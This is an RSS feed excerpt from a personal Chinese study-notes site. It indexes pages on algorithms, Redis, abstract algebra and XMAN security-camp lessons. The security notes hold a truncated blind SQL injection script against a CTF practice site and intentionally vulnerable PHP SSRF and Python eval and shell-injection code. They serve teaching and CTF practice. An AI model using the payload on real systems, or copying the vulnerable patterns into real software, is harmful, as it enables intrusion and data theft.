+0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E5%9B%BE%E8%AE%BA/tarjan/</guid><description>图论 # Tarjan # 实现 # Tarjan&amp;rsquo;s algorithm 是一个用于求解无向图割点与桥的算法。直接上代码：
void tarjan(int u, int v) { /* compute dfn and low while performing a dfs search - beginning at vertex u, v is the parent of u (if any) */ nodePointer ptr; int w; dfn[u] = low[u] = num++; for (ptr = graph[u]; ptr; ptr = ptr-&amp;gt;link) { w = ptr-&amp;gt;vertex; if (dfn[w] &amp;lt; 0) { /* w is an unvisited vertex */ tarjan(w,u); low[u] = min(low[u],low[w]); } else if (w !</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/st%E8%A1%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/st%E8%A1%A8/</guid><description>ST(Sparse Table) # 可重复贡献问题 # 对于运算 $$opt$$，如果它满足 $$x\ opt\ x = x$$，则对应的区间询问就是一个可重复贡献问题。
例如:
运算 max 有 $$max(x, x) = x$$，运算 gcd 有 $$gcd(x, x) = x$$ 所以 RMQ 和区间 GCD 就是一个可重复贡献问题。像区间和就不具有这个性质，如果求区间和的时候采用的预处理区间重叠了，则会导致重叠部分被计算两次，这是我们所不愿意看到的。另外， 还必须满足结合律才能使用 ST 表求解。 更具体的：
题目大意：给定 个数，有 个询问，对于每个询问，你需要回答区间 中的最大值。
考虑暴力做法。每次都对区间 扫描一遍，求出最大值。
显然，这个算法会超时。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%BB%E5%B8%AD%E6%A0%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%BB%E5%B8%AD%E6%A0%91/</guid><description>主席树 # 主席树全称“可持久化权值线段树”
什么是“可持久化数据结构”？
可持久化数据结构 (Persistent data structure) 总是可以保留每一个历史版本，并且支持操作的不可变特性 (immutable)。 一个最朴素的思路是每个版本都维护一个新的线段树：
Root1 Root2 Root3 ｜ | | 初始版本 更新操作1 更新操作2 一个显然的思路是：这个思路的空间复杂度特别高。
我们的某次更新操作只需要更改某个叶子结点的值，但是我们却需要复制整个线段树。“主席树”就是这样一个将提升空间复杂度利用率的数据结构。比如下图：
蓝色的是初始化的树结构，橙色的节点是进行了一次插入 (value: 4, count: 2) 之后的第二个版本的结构，可见第二个版本复用了第一个版本的需求节点。在查询时与普通的线段树类似，除了我们需要指定在哪个版本的根结点进行查询。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8D%95%E8%B0%83%E6%A0%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8D%95%E8%B0%83%E6%A0%88/</guid><description>单调栈 # 顾名思义，单调栈即满足单调性的栈结构。与单调队列相比，其只在一端进行进出。
相对于普通的栈结构，在处理单调栈时需要额外地关心在进行插入操作时需要将违背单调性的斩顶元素先弹出。代码：
while (!sta.empty() &amp;amp;&amp;amp; sta.top() &amp;lt; x) sta.pop() sta.push(x) 应用 # 离线解决 RMQ(Range Maximum/Minimum Query) 问题，即求解一个区间中的最大、最小值问题。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/</guid><description>堆 # 简介 # 堆是一棵树，其每个节点都有一个键值，且每个节点的键值都大于等于/小于等于其父亲的键值。
这一数据结构（考虑小根堆，大根堆是对称的）主要支持的操作有：“插入一个数”、“查询最小值”、“删除最小值”、“合并两个堆”、“减小一个元素的值”。
堆的类型 # 二叉堆 # 最常见的堆结构
配对堆（可并堆） #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B6%E6%9F%A5%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B6%E6%9F%A5%E9%9B%86/</guid><description>并查集 # 简介 # 参考：
https://visualgo.net/zh/ufds https://oi-wiki.org/ds/dsu/ 并查集是一种树形的数据结构，顾名思义，它用于处理一些不交集的 合并 及 查询 问题。 它支持两种操作：
查找（Find）：确定某个元素处于哪个子集； 合并（Union）：将两个子集合并成一个集合。 并查集优化：路径压缩，不关心连接状态时直接拼接到根结点。
应用 # 相关算法：
最小生成树算法中的 Kruskal&amp;rsquo;s algorithm 就是用的并查集的思想。 最近公共祖先中的 Tarjan&amp;rsquo;s algorithm 也是并查集的思想。 相关题目：
「NOI2015」程序自动分析
「JSOI2008」星球大战
「NOI2001」食物链
「NOI2002」银河英雄传说</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/1.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%AF%B9%E8%B1%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/1.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%AF%B9%E8%B1%A1/</guid><description>第一部分：数据结构与对象 # 因为阅读的书已经较为过时，新的数据结构没有完全讲完，比如：
zipmap、quicklist、stream 字符串 (Simple Dynamic String) # Redis 没有使用 C 语言中的 \0 结尾的方式表示一个字符串，而是自己构建了一个结构 SDS 作为基本字符串类型。这一结构的定义和实现分别在源码的 src/sds.h、src/sds.c 这两个文件中。
结构 # 以最长 256 字节长度串的结构 sdshdr8 为例：
struct __attribute__ ((__packed__)) sdshdr8 { uint8_t len; /* used */ uint8_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; 由上面的源码可以看出 SDS 结构的核心是：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/2.%E5%8D%95%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%BA%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/2.%E5%8D%95%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%BA%93/</guid><description>mixin # 概念 # Mixin 这个概念本身是一种设计模式，它指一个类不通过继承的方式获得另一个类的所有方法与属性，它通常可以用于解决在不能实现多继承的语言（TypeScript 就是这样一个只支持单继承的语言）中实现多继承。
TypeScript #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/%E9%94%81%E5%AE%9E%E7%8E%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/%E9%94%81%E5%AE%9E%E7%8E%B0/</guid><description>参考：
https://www.jianshu.com/p/81b0f1bd1328 Redis 实现锁机制 # 第一种锁命令 INCR # 这种加锁的思路是， key 不存在，那么 key 的值会先被初始化为 0 ，然后再执行 INCR 操作进行加一。
然后其它用户在执行 INCR 操作进行加一时，如果返回的数大于 1 ，说明这个锁正在被使用当中。
1、 客户端A请求服务器获取key的值为1表示获取了锁 2、 客户端B也去请求服务器获取key的值为2表示获取锁失败 3、 客户端A执行代码完成，删除锁 4、 客户端B在等待一段时间后在去请求的时候获取key的值为1表示获取锁成功 5、 客户端B执行代码完成，删除锁 $redis-&amp;gt;incr($key); $redis-&amp;gt;expire($key, $ttl); //设置生成时间为1秒 第二种锁 SETNX # 这种加锁的思路是，如果 key 不存在，将 key 设置为 value。
如果 key 已存在，则 SETNX 不做任何动作
1、 客户端A请求服务器设置key的值，如果设置成功就表示加锁成功 2、 客户端B也去请求服务器设置key的值，如果返回失败，那么就代表加锁失败 3、 客户端A执行代码完成，删除锁 4、 客户端B在等待一段时间后在去请求设置key的值，设置成功 5、 客户端B执行代码完成，删除锁 $redis-&amp;gt;setNX($key, $value); $redis-&amp;gt;expire($key, $ttl); 第三种锁 SET # 上面两种方法都有一个问题，会发现，都需要设置 key 过期。那么为什么要设置key过期呢？如果请求执行因为某些原因意外退出了，导致创建了锁但是没有删除锁，那么这个锁将一直存在，以至于以后缓存再也得不到更新。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day12/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day12/</guid><description>漏洞挖掘 # XSS # XSS自动化挖掘。重点在于输入与输出。 SQl注入 # Cookie、header、url、请求参数中均有可能触发。 PS：mysql常见的延时注入的函数：sleep、benchmark（重复执行同一个函数） sql注入的关键：如何闭合sql语句 SSRF与URL跳转 # 大部分SSRF、URL跳转漏洞触发在请求参数中。 redis是支持内网的常见服务，可以利用dict与gopher协议与之通信。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day13/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day13/</guid><description>Https下的Web同源安全问题研究 # XSS # Cookie基础 → 同源策略 # Cookie SOP相比Web SOP： 仅以domain/path作为同源限制 不区分端口 不区分HTTP/HTTPs 下午 # CRLF注入 # \r\n分割 Web Server的运行方式 # Apache # 默认prefork mode 同一个连接用同一个进程处理 mod_php Nginx # event-driven 同一个连接请求用不同的线程处理 php-fpm php disabled function绕过 # /proc/self/mem → 可以修改当前进程的内存 修改got 命令执行！ 访问头 # X-Forwarded-For 很多程序员用X-Forward-For来获取用户IP 在HTTP请求头中可以伪造 响应头 # X-XSS-Protection 一定程度上禁止反射性XSS攻击</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day15/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day15/</guid><description>无线攻防 # Fake AP #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day2/</guid><description>MISC # 0x00: Recon # 信息搜集 → 社会工程学 0x01: Encode # What is encoding? (From Stack-Overflow) The only thing that a computer can store is bytes. To store anything in a computer, you must first encode it. An encoding is a format to represent audio, images, text, etc in bytes. 二进制编码 # Python中与二进制相关的类型转化：
二进制字符串与十进制整型变量的相互转化：
dec_integer = int(&amp;#39;110&amp;#39;,2) # or &amp;#39;0b110&amp;#39; bin_integer = bin(6) # 类似的 hex(6)可以转化为16进制 PS：Python3中有Bytes类型的概念，可以用于做不同字符串编码格式的中介，比如：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day3/</guid><description>密码学Day1 # 密码学简介 # 一般来说，密码学的设计者根本目标是保障信息以及信息系统的以下几个方面的特性： 机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）、认证性（Authentication）、不可否认性（Non-repudiation） 前三者又被称为信息安全的CIA三要素 一般来说，我们都会假设攻击者已知待破解的密码体制，而攻击类型通常分为以下四种： 唯密文攻击：只拥有密文 已知明文攻击：拥有密文与对应的明文 选择明文攻击：拥有加密权限，能够对明文加密后获得相应密文 选择密文攻击：拥有解密权限，能够对密文解密后获得响应明文 古典密码 # 单表代换加密 # 一般有以下两种方式来进行破解： 在密钥空间较小的情况下，采用暴力破解的方式。 在密文长度足够长的时候使用词频分析。 分类：凯撒密码、移位密码、AtbashCipher、简单替换密码、仿射密码。下面关于仿射密码： 仿射密码 # 仿射密码的加密函数是：$$ E(x) = (ax+b) \mod m $$。其中： x 表示明文按照某种编码得到的数字 。 a与m互质。 m是编码系统中字母的数目。 仿射密码的解密函数是：$$ D(x) = a^{-1}*(x-b) \mod m $$。其中： $$a^{-1}$$ 是 a 在群 $$\mathbb{Z}_{m}$$ 的乘法逆元。 多表代换加密 # Polybius（棋盘密码） → 将给定的明文加密为两两组合的数字。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day4/</guid><description>密码学Day2 # 模数攻击 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day5/</guid><description>Web Day1 # 所需知识 # HTTP抓包/修改：Http请求、响应流程
web前端：Cookie、缓存、跨域问题、编码（url编码、html实体编码、js编码）
web后端：php → 官方文档；Python → 廖雪峰Python教程
数据库与服务器
常见的web漏洞：XSS、SQL注入、CSRF、SSRF、命令执行、XXE、文件上传/包含/写入、反序列化、未授权访问、目录遍历、业务逻辑漏洞
工具：Sqlmap、Burpsuit、Hackbar、Proxy SwitchyOme、Postman&amp;hellip;
Http请求 # Http请求响应 # 请求包格式 → 请求头格式：请求方法 + url/path + 协议版本 GET请求 → 从指定的资源请求数据 → 可以被缓存，有长度限制 POST请求 → 向指定的资源提交要被处理的数据 → 不会被缓存，没有长度限制 响应包 → 响应头：响应协议+状态码；响应主体：html代码 PHP后端获取请求头：$_SERVER['HTPP_USER_AGENT'] 常见请求头说明： Content-Length：请求长度，为了告诉服务器有多长（有时没有，使用一些分隔符指明长度） 题目类型 # 入门题目</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day6/</guid><description>Web Day2 # sql注入 # sql盲注脚本
import requests import re import sys p = re.compile(r&amp;#39;&amp;#39;&amp;#39;ID: (.+?)&amp;amp;nbspx:&amp;#39;&amp;#39;&amp;#39;) ans = &amp;#39;&amp;#39; for pos in range(1,33): l = 0 r = 127 cookies = {&amp;#34;PHPSESSID&amp;#34;:&amp;#34;tf7511brt2272n9ne5i8dj6o35&amp;#34;} data = {&amp;#34;x&amp;#34;: &amp;#34;1&amp;#34;, &amp;#34;y&amp;#34;: &amp;#34;1&amp;#34;} while l&amp;lt;r: mid = int((l+r)/2) resp = requests.post( &amp;#34;https://web.ctflearn.com/grid/controller.php?action=add_point&amp;#34;, data=data, cookies=cookies).text resp = requests.get(&amp;#34;https://web.ctflearn.com/grid/&amp;#34;, cookies=cookies).text _id = p.search(resp).group(1) payload = _id + &amp;#39; and ord(mid((select password from user where username=&amp;#34;admin&amp;#34; limit 0, 1), &amp;#39; + str(pos) + &amp;#39;,1))&amp;gt;&amp;#39; + str(mid) length = len(payload) resp = requests.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day7/</guid><description>Web服务器端安全 # 前置知识 # Http协议 # url说明 协议 http + 用户密码 user@pass +ip地址 127.0.0.1 + 端口port 8080 + 页面 index.php + 参数 ?id=123 + 锚点 #123 Http(s)协议：URL、HOST、User-Agent、Referer（代表跳转来源 → 可以用与做流量统计）、Cookie（反序列化）、X-Forwarded-For SQL注入 # 根本原因：脚本语言无法理解SQL语句，对查询语句处理不一致，导致SQL注入，篡改了SQL语句原本逻辑 SQL注入防御 # 字符串拼接形式：过滤单引号、双引号、反斜杠等关键词；转义(addslashes、mysqli_real_escape_string) 变量绑定，先给sql查询变量一个占位符，然后调用mysql的库进行预编译。 String sql = &amp;#34;select id, no from user where id=?&amp;#34;; PrepareStatement ps = conn.prepareStatement(sql); ps.SetInt(1, id); ps.executeQuery(); SQL注入类型 # Union注入</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day8/</guid><description>代码审计 # PHP代码审计 # 什么是代码审计：是指对源代码进行检查，寻找代码的bug，这里主要寻找可以导致安全漏洞的bug 代码审计的技巧（程序的两大根本：变量与函数）： 根据敏感的关键字回溯参数的传递过程 查找可控变量，正向追踪变量的传递过程 查找敏感功能点，通读功能点代码 直接通读全文代码 自动化审计工具：Seay（PHP代码审计工具）、Cobra、Fortify SCA&amp;hellip; SSRF漏洞 # SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 常见后端实现 # 可以进行SSRF的常见后端实现：
使用file_get_content()，从用户指定的url获取图片，并把他保存下来： &amp;lt;?php if(isset($_POST[&amp;#39;url&amp;#39;])){ $$content = file_get_contents($$_POST[&amp;#39;url&amp;#39;]); $filename = &amp;#39;./images/&amp;#39;.rand().&amp;#39;;img1.jpg&amp;#39;; file_put_contents($$filename, $$content); echo $_POST[&amp;#39;url&amp;#39;]; $$img = &amp;#34;&amp;lt;img src=\&amp;#34;&amp;#34;.$$filename.&amp;#34;\&amp;#34;/&amp;gt;&amp;#34;; } echo $img; ?&amp;gt;使用fsockopen()函数 → 这个函数会利用socket跟服务器建立TCP连接，传输用户指定的url数据数据： &amp;lt;?php function GetFile($$host, $port, $$link){ $$fp = fsockopen($host, intval($host), $errno, $$errstr, 30); if(!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day9/</guid><description>Python代码审计 # OS命令注入 # 与OS命令注入攻击相关的模块：eval()、os.system()、os.popen*、subprocess.popenos.spawn*、commands.*、popen2.*。
下面是一个用Python中Django写的，可以利用eval命令注入的简单Python Web服务的Demo： def eval_test(request): if request.method == &amp;#39;GET&amp;#39;: return render_to_response(&amp;#39;eval.html&amp;#39;,context_instance=RequesetContext(request)) elif request.method == &amp;#39;POST&amp;#39;: domain = request.POST.get(&amp;#39;domain&amp;#39;,&amp;#39;&amp;#39;) command = &amp;#34;os.popen(&amp;#39;whois&amp;#34; + domain + &amp;#34;&amp;#39;)&amp;#34; output = eval(command) return render_to_response(&amp;#39;eval.html&amp;#39;, {&amp;#39;output&amp;#39;:output.readlines()}, context_instance=RequestContext(request)) OS命令注入：subprocess.call函数（shell=True时，函数会在命令前添加-c选项）。开发建议 → 使用pipes.quote()函数去过滤用户输入；尽量不要使用shell=True&amp;hellip; subprocess.call(&amp;#34;cat &amp;#34; + user_input, shell=True) subprocess.call(&amp;#34;cat %s&amp;#34;%(user_input), shell=True) subprocess.call(&amp;#34;cat {0}&amp;#34;.format(user_input), shell=True) 简单练习 # @app.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/1.week_one/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/1.week_one/</guid><description>第一周 # 概念 # 集合的大小：集合的势。
基数：
可数集（countable set）： a countable set is a set with the same cardinality (number of elements) as some subset of the set of natural numbers. A countable set is either a finite set or a countably infinite set.
graph LR; A[集合]; B1[有限集]; B2[无限集]; C1[可数集]; C2[不可数集]; A--&amp;gt;B1; A--&amp;gt;B2; B2--&amp;gt;C1; B2--&amp;gt;C2; 同余。
同余关系，等价关系。
数论基础 # 整除的性质。
序偶。序组。叉积。
辗转相除——求最大公约数。
定理：
如果 a,b 互素，存在整数 m,n 使得 $$a m + b n = 1$$ 算术基本定理：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/10.%E5%AD%90%E7%BE%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/10.%E5%AD%90%E7%BE%A4/</guid><description>子群 # 概念和性质 # 定义（子群）：
$$(G, *)$$ 是一个群，子集 $$H \sub G$$，如果 H 对于运算 * 也构成群，则称 H 是 G 的子群，记为 $$H \le G$$。 又于 $${e}, G$$ 必是 G 的子群，我们称他们为平凡子群，否则为非平凡子群 如果群 $$H \not= G$$，我们称 H 为真子群，记为 $$H &amp;lt; G$$ 定义（正规子群）：
设两个群满足 $$K \le G$$，如果对 $$\forall k \in K, g \in G \Rightarrow gkg^{-1} \in K$$，则 K 称为 G 的正规子群，记为 $$K \vartriangleleft G$$ 定理：
任意交换群 G 的每个子群 K 都是正规子群 定理：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/11.%E5%BE%AA%E7%8E%AF%E7%BE%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/11.%E5%BE%AA%E7%8E%AF%E7%BE%A4/</guid><description>循环群 # 概念和性质 # 定义（循环子群）：
G 是一个群，且 $$a \in G$$，则令以下集合称为由元素 a 生成的 G 的循环子群：
$$ = {a^n | n \in \mathbb{Z}}$$
PS：定理：&amp;lt;a&amp;gt; 是一个群，且是 G 的子群
定义（循环群）：
G 是一个群，如果存在 $$a \in G$$ 使得 $$G = $$。则称 G 为循环群，而且称 a 为 G 的生成元。 定理：
